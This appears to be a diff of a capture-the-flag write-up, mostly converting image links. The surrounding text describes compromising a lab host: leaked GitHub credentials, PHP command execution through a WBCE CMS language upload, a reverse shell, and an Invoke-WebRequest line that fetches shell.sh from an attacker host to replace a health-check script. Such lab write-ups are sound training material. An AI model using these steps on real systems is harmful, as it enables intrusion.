@@ -66,8 +66,7 @@ PORT     STATE SERVICE       VERSION
 ## FTP Reveals a Hidden File
 
 FTP allows anonymous login, and we find a hidden file `.note.txt`. We can download it using the `get` command.
-
-![[ftp-session.png]]
+![image](./images/ftp-session.png)
 It has the following note:\
 ```
 You could ask me to give you a virtual machine in the Cloud. Why are you doing such weird thing, Mr. Windoclin? Who setups Windows Server that way?
@@ -81,12 +80,12 @@ Here, we learn that the user's name is `Windoclin` and he did something extraord
 Although the FTP service seems exploitable (vsftpd 2.3.4 has a public exploit for backdoor command execution via CVE-2011-2523), it is a **rabbit hole** and won’t be useful.
 ## Github OSINT
 Searching for `windoclin` on GitHub reveals a repository that points to his profile.
-![[github-osint.png]]
+![image](./images/github-osint.png)
 We discover another repo called *autotask*:
 - https://github.com/windoclin/autotask
-![[github-osint-2.png]]
+![image](./images/github-osint-2.png)
 It contains automation scripts that leak credentials:
-![[github-osint-3.png]]
+![image](./images/github-osint-3.png)
 ```python
 ...
 username = "supascrtadminus3r"
@@ -96,33 +95,33 @@ password = "supascrtp4ssw0rd!!"
 # CMS
 ## Recon
 When we send a GET request to the IP, it redirects to `http://10.0.10.25/wbce/`. 
-![[cms-redirects.png]] If we request the new URL again (or navigate to it in a browser), we see it requires resources from `http://windoclin/wbce`. This indicates we need to add the `windoclin` hostname to the `/etc/hosts` file. 
-![[cms-hostname-revealed.png]] `wbce` in the URL suggests that the CMS in use is WBCE. 
-![[wbce-cms.png]] This CMS does exist, and it has several exploits available. 
-![[wbce-cms-googled.png]]
+![image](./images/cms-redirects.png) If we request the new URL again (or navigate to it in a browser), we see it requires resources from `http://windoclin/wbce`. This indicates we need to add the `windoclin` hostname to the `/etc/hosts` file. 
+![image](./images/cms-hostname-revealed.png) `wbce` in the URL suggests that the CMS in use is WBCE. 
+![image](./images/wbce-cms.png) This CMS does exist, and it has several exploits available. 
+![image](./images/wbce-cms-googled.png)
 ## CMS Admin Access
-By checking some common directory names, we can find the **admin portal** of the CMS, where we can log in using the credentials found earlier. ![[cms-admin-panel.png]] From the admin dashboard, we find the following information: `WBCE Version: 1.6.2`.
+By checking some common directory names, we can find the **admin portal** of the CMS, where we can log in using the credentials found earlier. ![image](./images/cms-admin-panel.png) From the admin dashboard, we find the following information: `WBCE Version: 1.6.2`.
 ## RCE
 We use the following exploit:
 - https://github.com/capture0x/WBCE_CMS/
 
 To get RCE, navigate to **Add-ons**, then **Languages**, and **install a language**. 
-![[cms-admin-dashboard.png]] 
+![image](./images/cms-admin-dashboard.png) 
 Let’s try a simple payload:
 ```php
 <?php system('whoami');?>
 ```
 Write this to a PHP file, upload it, and click **Install**. 
-![[cms-rce.png]]
+![image](./images/cms-rce.png)
 The exploit succeeded! We got `nt authority\system`, which grants the highest privilege on the system.
 ### Reverse Shell
 For a reverse shell, I used this exploit:
 - https://github.com/ivan-sincek/php-reverse-shell
 Modify port and IP and repeat the steps:
-![[cms-reverse-shell.png]]
+![image](./images/cms-reverse-shell.png)
 # Windows Enumeration
 Let's check Desktop of the **windoclin** user:
-![[windows-enum.png]]
+![image](./images/windows-enum.png)
 We find a shortcut to a folder located in a network share: `\\host.lan`.
 ```powershell
 net view \\host.lan
@@ -152,7 +151,7 @@ Z:\>dir
 01/30/2024  11:47 PM    <DIR>          WBCE_CMS-1.6.2
 ```
 Congratulations! We found `user.txt`!
-![[windows-shared-folder.png]]
+![image](./images/windows-shared-folder.png)
 # Windows Docker Escape
 Three files interest us:
 - `README.MD`
@@ -231,7 +230,7 @@ while true; do
 done
 ```
 After creating `shell.sh`, transfer it onto the target machine, which can be done via a Python server.
-![[prepare-exploit.png]]
+![image](./images/prepare-exploit.png)
 
 Then, on the target machine, replace the file in `Z:/`:
 ```powershell
@@ -241,11 +240,11 @@ Invoke-WebRequest -Uri http://10.0.10.35:8000/shell.sh -OutFile healthy.sh
 Set up a listener and wait for a connection.
 
 Finally, voilà! We successfully obtain a shell and retrieve `root.txt`!
-![[machine-exploited.png]]
+![image](./images/machine-exploited.png)
 # Conclusion
 By exploring further, we can find a `docker-compose.yml` file, which reveals that **Windows** is running as a **Docker container** on a **Linux** host. The shared folder we accessed earlier is mounted between the Linux host and the Docker container.  
-![[docker-compose-file.png]]  
-![[shared-folder.png]]
+![image](./images/docker-compose-file.png)  
+![image](./images/shared-folder.png)
 
 This was a non-standard Docker escape technique that leveraged weak file integrity checks.
 
